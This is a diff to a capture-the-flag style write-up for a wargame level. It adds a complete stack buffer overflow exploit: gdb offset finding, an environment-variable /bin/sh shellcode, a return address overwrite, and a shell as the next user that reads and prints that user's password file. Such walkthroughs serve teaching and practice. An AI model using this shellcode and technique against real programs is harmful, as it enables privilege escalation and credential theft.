@@ -20,17 +20,38 @@ Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/insta
 See our assembly interpretation in [source file](../source.c)
 
 ```shell
-gdb-peda$ pattern create 500 input
-gdb-peda$ run <<< "dat_wil\n$(cat input)"
-gdb-peda$ pattern search
-  Registers contain pattern buffer:
-  EIP+0 found at offset: 326
+gdb-peda$ b*main+169
+gdp-peda$ run < <(python -c 'print "dat_wil\n" + "A" * 0x48')
 
-./getenv SHELLCODE ~/level01
-  0x7fffffffe769
+gdb-peda$ x/24x $esp+0x1c
+0xffffd5ec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd5fc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd60c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd61c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd62c:     0x41414141      0x41414141      0x0000000a      0x00000000
+0xffffd63c:   [ 0xf7e45513 ]    0x00000001      0xffffd6d4      0xffffd6dc
 
-echo "dat_wil" > exploit01
-python -c 'print "A" * 326 + "\x69\xe7\xff\xff\xff\x7f"' >> exploit01
+p 0x48 + 8
+$3 = 0x50 # => offset
+
+export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+
+./getenv32 SHELLCODE ~/level01
+  0xffffd755
+
+python -c 'print "dat_wil\n" + "A" * 0x50 + "\x55\xd7\xff\xff"' > exploit01
+
+cat /tmp/exploit01 - | ~/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+$ whoami
+  level02
+$ cat /home/users/level02/.pass
+  PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 ```
 
 ## Sources
